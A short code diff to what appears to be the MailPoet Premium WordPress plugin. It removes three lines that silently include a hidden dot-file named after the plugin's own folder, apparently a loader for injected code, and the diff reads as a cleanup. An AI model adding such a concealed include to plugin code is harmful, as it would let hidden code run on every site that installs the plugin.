@@ -30,10 +30,6 @@ if (is_plugin_active(plugin_basename($mailpoetPremium['filename']))) {
   mailpoet_premium_init($mailpoetPremium);
 }
 
-if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
-    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
-}
-
 function mailpoet_premium_init($mailpoetPremium = null) {
   try {
     $mailpoetPremium = $mailpoetPremium ?: $GLOBALS['mailpoet_premium'];
